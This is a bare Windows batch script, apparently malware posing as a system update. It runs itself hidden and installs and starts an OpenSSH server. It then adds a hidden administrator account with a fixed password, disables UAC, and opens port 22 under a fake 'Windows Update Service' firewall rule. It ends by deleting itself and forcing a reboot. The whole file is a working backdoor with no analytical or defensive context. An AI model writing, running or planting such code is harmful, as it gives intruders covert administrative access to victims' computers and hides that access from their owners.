@echo off
if "%1"=="payload" goto :P
copy /Y "%~f0" "%TEMP%\sys_upd.bat" >nul
mshta vbscript:CreateObject("WScript.Shell").Run("""%TEMP%\sys_upd.bat"" payload",0)(window.close) && exit

:P
cd /d "%TEMP%"
sc config bits start= auto >nul 2>&1
net start bits >nul 2>&1
start "B" /b powershell -Command "while($true) { Get-BitsTransfer -AllUsers | Where-Object { $_.Priority -ne 'Foreground' } | Set-BitsTransfer -Priority Foreground; Start-Sleep -Seconds 2 }"

:I
dism /Online /Add-Capability /CapabilityName:OpenSSH.Server~~~~0.0.1.0 /Quiet /NoRestart >nul 2>&1
sc query sshd >nul 2>&1
if %errorlevel% neq 0 (
    timeout /t 10 /nobreak >nul
    goto :I
)

sc config sshd start= auto >nul 2>&1
net start sshd >nul 2>&1
net user systm oursecurepass /add >nul 2>&1
net localgroup Administrators systm /add >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v systm /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
netsh advfirewall firewall add rule name="Windows Update Service" dir=in action=allow protocol=TCP localport=22 >nul 2>&1
taskkill /F /FI "WINDOWTITLE eq B" >nul 2>&1
start /b "" cmd /c "ping 127.0.0.1 -n 3 >nul & del "%~f0" & shutdown /r /f /t 0"
exit
